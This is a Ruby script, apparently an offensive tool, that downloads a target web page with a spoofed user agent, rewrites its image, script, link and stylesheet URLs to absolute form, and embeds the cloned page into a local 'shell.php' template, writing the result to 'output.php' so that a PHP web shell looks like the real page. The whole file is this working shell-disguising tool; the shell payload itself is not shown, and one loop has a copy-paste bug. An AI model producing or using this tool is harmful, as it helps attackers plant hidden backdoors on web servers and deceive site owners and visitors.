#!/usr/bin/env ruby
#
require 'open-uri'
require 'rubygems'
require 'erb'
require 'mechanize'
require 'uri'

@agent = Mechanize.new()
@agent.user_agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
url = ARGV[0]

baseurl = URI(url).scheme + "://" + URI(url).host

puts "Injecting shell into #{url}"

page_raw = @agent.get(url).body()
shell = File.open("shell.php", "r").read()

page_html = Nokogiri::HTML(page_raw)

images = page_html.css("img")
scripts = page_html.css("script")
links = page_html.css("a")
css = page_html.css("link")

fixes = 0

for image in images
	begin
		if image["src"][0..3] != "http" and image["src"][0..1] == "//"
			image["src"] = "http:" + image["src"]
			fixes += 1
		elsif image["src"][0] == "/"
			image["src"] = baseurl + image["src"]
			fixes += 1
		elsif image["src"][0..1] == ".."
			image["src"] = url + image["src"]
			fixes += 1
		end
	rescue Exception => e
		#puts "image error " + e.to_s
	end
end

for link in links
	begin
		if link["href"][0..3] != "http" and link["href"][0..1] == "//"
			link["href"] = "http:" + link["href"]
			fixes += 1
		elsif link["href"][0] == "/"
			link["href"] = baseurl + image["src"]
			fixes += 1
		elsif link["href"][0..1] == ".."
			link["href"] = url + link["href"]
			fixes += 1
		end
	rescue Exception => e
		# puts "link error " + e.to_s
	end
end

for script in scripts
	begin
		if script["src"][0..3] != "http" and script["src"][0..1] == "//"
			script["src"] = "http:" + script["src"]
			fixes += 1
		elsif script["src"][0] == "/"
			script["src"] = baseurl + script["src"]
			fixes += 1
		elsif script["src"][0..1] == ".."
			script["src"] = url + script["src"]
			fixes += 1
		end
	rescue Exception => e
		#puts "script error " + e.to_s
	end
end

for stylesheet in css
	begin
		if stylesheet["href"][0..3] != "http" and stylesheet["href"][0..1] == "/"
			stylesheet["href"] = "http:" + stylesheet["href"]
			fixes += 1
		elsif stylesheet["href"][0] == "/"
			stylesheet["href"] = baseurl + stylesheet["href"]
			fixes += 1 
		elsif stylesheet["href"][0..1] == ".."
			stylesheet["href"] = url + stylesheet["href"]
			fixes += 1
		end
	rescue Exception => e
	end
end

puts "Fixed #{fixes} dependency issues"

$page = page_html.to_html

result = ERB.new(shell).result()
output = "output.php"

File.open(output, "w") { |file| file.write(result) }
puts "Page injected to #{output}"